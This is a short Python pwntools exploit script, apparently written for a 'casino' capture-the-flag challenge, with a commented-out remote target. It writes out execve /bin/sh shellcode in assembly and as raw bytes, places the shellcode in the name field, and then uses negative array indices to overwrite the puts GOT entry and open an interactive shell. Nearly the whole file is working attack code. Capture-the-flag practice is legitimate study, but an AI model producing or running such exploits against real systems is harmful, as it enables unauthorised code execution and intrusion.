#!usr/bin/pythin3
from pwn import *

context.arch = "amd64"
re = process( './casino/casino')
#re = remote('edu-ctf.csie.org', 10172)

# sc = b"\x48\x31\xff\x48\x31\xf6\x48\x31
#               \xd2\x48\x31\xc0\x50 \x48\xbb\x2f
#               \x62\x69\x6e\x2f\x2f\x73\x68\x53 
#               \x48\x89\xe7\xb0\x3b\x0f\x05"
shellcode = """
                    xor rdi, rdi
                    xor rsi, rsi
                    xor rdx, rdx
                    xor rax, rax
                    push rax
                    mov rbx,0x68732f2f6e69622f
                    push rbx
                    mov rdi, rsp 
                    mov al, 0x3b
                    syscall
                        """
sc = asm( shellcode )
seed = "\x62\x69\x6e\x2f" #bin/
age = "1399354159" #\x2f\x73\x68\x53
re.sendlineafter( "name:", sc)
re.sendlineafter( "age:", age)

lottery_add = 0x6020b0
guess_add = 0x6020d0
#put = guess-22
#0x602020
name_add = 0x6020f0
seed_add = 0x602100
age_add = 0x602104

#lottery number 9 19 1 87 96 11
lottery = ["9", "19", "1", "87", "96", "11"]
for i in range(0, 6):
    re.sendlineafter( ":",  "1")

#guess[-44] is 0x602020 (GOT_puts)
re.sendlineafter(":", "1")
re.sendlineafter(":", "-43")
name = "6299888"
re.sendlineafter(":", name)

for i in range(0, 6):
    re.sendlineafter( ":",  lottery[i])
re.sendlineafter(":", "1")
re.sendlineafter(":", "-42")

re.sendlineafter(":", "0")
re.interactive()